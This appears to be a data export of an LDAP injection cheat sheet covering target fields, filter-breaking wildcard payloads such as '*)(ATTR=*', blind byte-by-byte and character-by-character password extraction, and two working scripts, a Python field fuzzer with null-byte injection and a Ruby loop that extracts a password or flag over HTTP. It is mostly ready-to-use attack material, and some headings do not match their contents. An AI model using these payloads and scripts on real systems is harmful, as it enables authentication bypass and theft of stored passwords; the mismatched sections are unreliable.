entries.title: What LDAP injection is and where to look
entries.body:
LDAP injection occurs when user input is placed into an LDAP filter without escaping. Through a local proxy the attacker changes the filter logic by adding their own conditions.

Where to look:
• Login forms (login / username + password) - the typical target for authentication bypass.
• Directory search fields (search, dir, cn, mail).
• Any input that ends up in a query of the form (&(uid=INPUT)(...)).

Exploitation idea: first inject the special characters * ( ) | & and break the filter, then fine-tune the conditions so as to get always-true or to extract attributes one character at a time (blind).

rows: logical AND - all nested conditions must be true
logical OR - one true condition is enough
logical NOT - negation of a condition
equality of an attribute to a value
wildcard - any sequence of characters (including an "attribute exists" check)
escaped byte (hex), needed for OCTET STRING and special characters
NULL byte - cuts off the "tail" of the original filter

entries.title: Ready-made wildcard payloads for the login field
Injecting an additional attribute: *)(ATTR=*
entries.body:
Injection template for appending a condition to the filter:

*)(ATTRIBUTE_HERE=*

Instead of ATTRIBUTE_HERE substitute directory attributes (see the list below). This way you can check for the existence of attributes and change the logic of the original (&(login=...)(password=...)).

entries.title: Standard LDAP attributes for injection
entries.body:
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName

entries.title: Fuzz dictionary of LDAP metacharacters (raw + URL-encoded)
The userPassword attribute is an OCTET STRING, not a string
entries.body:
userPassword is not a string (like cn) but an OCTET STRING. In LDAP every object/type/operator is addressed via an OID. For bit-by-bit comparison the matching rule octetStringOrderingMatch (OID 2.5.13.18) is used: it compares two octet strings bit by bit (big endian) until it finds a difference; a value with a zero bit is considered less than a value with a one bit.

This lets you blind-brute-force the password byte by byte via an extensible match.

entries.title: Brute-forcing userPassword byte by byte via OID 2.5.13.18
entries.body:
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx

entries.title: Character-by-character password brute-force via wildcard
entries.body:
The filter responds differently to a matching/non-matching prefix - that is the oracle. We brute-force characters as in a binary search:

(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK

entries.title: Breakdown of the blind filter
entries.body:
• &                  logical AND - all the conditions inside must be true.
• (sn=administrator)  matches records where the attribute sn (surname) = administrator.
• (password=X*)       matches if password starts with X (case-sensitive). * is a wildcard for any remainder.

By iterating X from A to Z, then adding the next character, you build up the whole value from the OK/KO reaction.

entries.title: Finding valid LDAP fields (Python)
entries.body:
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)

entries.title: Blind exfiltration of a value character by character (Python)
Blind exfiltration of a value character by character (Ruby, @noraj)
entries.body:
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
